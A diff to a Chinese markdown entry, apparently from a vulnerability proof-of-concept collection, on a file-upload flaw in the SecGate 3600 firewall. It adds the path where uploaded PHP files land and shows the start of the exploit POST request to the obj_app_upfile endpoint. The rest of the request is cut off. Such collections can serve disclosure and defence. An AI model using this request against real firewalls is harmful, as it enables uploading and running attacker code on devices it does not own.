@@ -1,5 +1,6 @@
 ## 网神 SecGate 3600 防火墙 obj_app_upfile上传漏洞
 
+### 访问路径：attachements/xxx.php
 ```
 POST /?g=obj_app_upfile HTTP/1.1
 Host: x.x.x.x
